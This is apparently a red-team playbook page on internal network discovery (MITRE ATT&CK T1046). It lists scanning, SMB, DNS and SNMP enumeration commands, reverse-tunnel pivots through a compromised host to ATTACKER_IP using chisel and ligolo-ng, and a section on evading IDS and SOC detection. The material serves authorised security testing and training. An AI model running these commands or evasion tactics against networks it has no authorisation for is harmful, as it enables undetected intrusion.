# Internal Network Discovery

> **MITRE ATT&CK**: Discovery > T1046 - Network Service Discovery
> **Platforms**: Windows, Linux (pivot hosts)
> **Required Privileges**: User (local network access)
> **OPSEC Risk**: Medium (scanning generates traffic anomalies)

## Strategic Overview

Internal network discovery during a red team engagement is fundamentally different from a penetration test. The goal is not to find every open port on every host -- it is to identify the specific assets that advance your objective while avoiding detection. A full nmap scan of a /16 will trigger every IDS and SOC alert in existence. Instead, discovery should be targeted, incremental, and leverage existing access to build a network map organically. Start with passive observation (ARP cache, DNS, network connections), then move to targeted active scanning of specific subnets and ports.

**Discovery priority**: Current subnet -> Server VLANs -> Database tier -> Management networks -> DMZ/cloud segments.

## Technical Deep-Dive

### Passive Discovery (Living Off the Land)

```cmd
:: Windows -- zero additional tools required
arp -a                                    :: Cached ARP entries (local subnet neighbors)
route print                               :: Routing table (reveals known subnets)
ipconfig /all                             :: Full adapter config, DNS servers, DHCP
netstat -ano                              :: Active connections (reveals internal services)
net view                                  :: Enumerate visible computers in workgroup/domain
net view /domain                          :: Enumerate all domains
nslookup -type=srv _ldap._tcp.corp.local  :: Find domain controllers via DNS
nslookup -type=srv _kerberos._tcp.corp.local

:: DNS reverse lookup sweep (quiet, uses normal DNS)
for /L %i in (1,1,254) do @nslookup 10.10.10.%i 2>nul | find "Name"
```

```bash
# Linux pivot host
ip neigh show           # ARP cache
ip route show           # Routing table
ss -tlnp                # Listening services
cat /etc/resolv.conf    # DNS servers
cat /etc/hosts          # Static host mappings
```

### ARP Scanning (Subnet Discovery)

```bash
# arp-scan -- fast local subnet enumeration
arp-scan -l                              # Scan local subnet
arp-scan -I eth0 10.10.10.0/24          # Specific subnet

# Nmap ping sweep (ICMP + ARP on local subnet)
nmap -sn 10.10.10.0/24                  # Host discovery only
nmap -sn -PE -PP -PM 10.10.10.0/24     # Multiple ICMP types

# netdiscover (passive or active ARP)
netdiscover -i eth0 -r 10.10.10.0/24   # Active
netdiscover -i eth0 -p                  # Passive (listen only -- zero noise)
```

### Port Scanning (Targeted)

```bash
# Targeted port scan -- only scan ports relevant to objectives
nmap -sT -p 445,3389,5985,5986,1433,3306,8080,8443 10.10.10.0/24 --open -oA internal_scan

# Top 20 ports for internal networks (fast, focused)
nmap -sT --top-ports 20 10.10.10.0/24 --open --min-rate 100

# Service version detection on discovered hosts
nmap -sV -p 445,1433,3389 10.10.10.50,51,52 -oA service_detail

# Scanning through SOCKS proxy (from pivot)
proxychains nmap -sT -Pn -p 445,3389,5985 10.20.30.0/24 --open
# Note: -sT required through proxy (no SYN scan), -Pn required (ICMP won't traverse proxy)
```

### Scanning Through Tunnels

```bash
# Chisel -- SOCKS proxy through compromised host
# On attacker (server)
chisel server -p 8080 --reverse
# On target (client)
chisel client ATTACKER_IP:8080 R:1080:socks

# Ligolo-ng -- transparent pivot (no proxychains needed)
# On attacker
ligolo-proxy -selfcert
# On target
ligolo-agent -connect ATTACKER_IP:11601 -retry -ignore-cert
# Then add route on attacker: ip route add 10.20.30.0/24 dev ligolo

# SSH dynamic port forward
ssh -D 1080 user@pivot_host
proxychains nmap -sT -Pn -p 445 10.20.30.0/24
```

### SMB Enumeration

```bash
# CrackMapExec -- rapid SMB enumeration
crackmapexec smb 10.10.10.0/24                           # Host discovery + OS version
crackmapexec smb 10.10.10.0/24 -u jsmith -p 'Pass1' --shares   # Share enumeration
crackmapexec smb 10.10.10.0/24 -u jsmith -p 'Pass1' --sessions # Active sessions
crackmapexec smb 10.10.10.0/24 -u '' -p '' --shares      # Null session shares

# smbclient -- manual share browsing
smbclient -L //10.10.10.50 -U 'CORP\jsmith%Password1'
smbclient //10.10.10.50/share$ -U 'CORP\jsmith%Password1'
```

### Internal DNS Enumeration

```bash
# DNS zone transfer attempt (surprisingly common internally)
dig axfr corp.local @10.10.10.1
host -t axfr corp.local 10.10.10.1

# Reverse DNS sweep
dnsrecon -r 10.10.10.0/24 -n 10.10.10.1
dnsenum --dnsserver 10.10.10.1 -f /usr/share/wordlists/subdomains.txt corp.local

# Internal subdomain brute force
gobuster dns -d corp.local -r 10.10.10.1:53 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

### SNMP Sweeps

```bash
# SNMP community string guessing
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 10.10.10.0/24

# SNMP walk with discovered community string
snmpwalk -v2c -c public 10.10.10.50 | head -100
snmpwalk -v2c -c public 10.10.10.50 1.3.6.1.4.1.77.1.2.25  # Enumerate users
```

### Service Identification

```bash
# Web application discovery
crackmapexec http 10.10.10.0/24 -p 80,443,8080,8443,8888

# Database discovery
nmap -sT -p 1433,1434,3306,5432,27017,6379,1521 10.10.10.0/24 --open

# EyeWitness -- screenshot internal web apps
eyewitness --no-prompt -f urls.txt --web -d eyewitness_output
```

## Detection & Evasion

| Technique | Detection Risk | Evasion Strategy |
|-----------|---------------|------------------|
| Full subnet port scan | High -- IDS/firewall alerts | Scan only needed ports, slow rate |
| ARP scanning | Low (local subnet only) | Normal network behavior |
| Passive ARP/route/netstat | Very Low | Standard admin commands |
| DNS reverse lookups | Low | Normal DNS traffic |
| SMB share enumeration | Medium | Authenticated queries look normal |
| SNMP sweeps | Medium | Target only known SNMP hosts |

**Key evasion strategies**:
- Scan no more than 5-10 ports across a subnet at a time
- Use `--min-rate 10` or slower for nmap to avoid triggering rate-based IDS rules
- Space scanning activity across days rather than running everything at once
- Prefer authenticated enumeration (CrackMapExec with valid creds) over unauthenticated scanning
- Use passive methods first -- ARP cache, routing tables, and DNS often reveal enough

## Cross-References

- [AD Enumeration](./ad-enumeration.md)
- [Lateral Movement](../07-lateral-movement/)
- [C2 Infrastructure](../11-command-and-control/c2-infrastructure.md)
- [Pivoting and Tunneling](../07-lateral-movement/)

## References

- MITRE ATT&CK T1046: https://attack.mitre.org/techniques/T1046/
- Nmap Reference Guide: https://nmap.org/book/man.html
- CrackMapExec Wiki: https://wiki.porchetta.industries/
- Ligolo-ng: https://github.com/nicocha30/ligolo-ng
- Chisel: https://github.com/jpillora/chisel
